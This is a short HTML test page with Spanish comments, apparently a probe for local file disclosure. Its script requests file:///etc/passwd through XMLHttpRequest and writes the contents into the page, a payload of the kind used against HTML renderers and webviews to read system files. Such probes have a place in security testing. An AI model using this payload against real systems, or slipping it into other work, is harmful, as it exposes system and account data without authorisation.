<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>XMLHttpRequest Test</title>
  <style>
    body {
      font-family: monospace;
      white-space: pre-wrap;
    }
  </style>
</head>
<body>
  <h1>📄 XMLHttpRequest + file:// Test</h1>

  <script>
    var x = new XMLHttpRequest();
    x.onload = function () {
      // En vez de usar document.write(), insertamos dentro de un <pre>
      var pre = document.createElement("pre");
      pre.innerText = this.responseText;
      document.body.appendChild(pre);
    };
    x.onerror = function () {
      document.body.innerHTML += "<p>[❌] Error al leer el archivo.</p>";
    };
    x.open("GET", "file:///etc/passwd");
    x.send();
  </script>
</body>
</html>
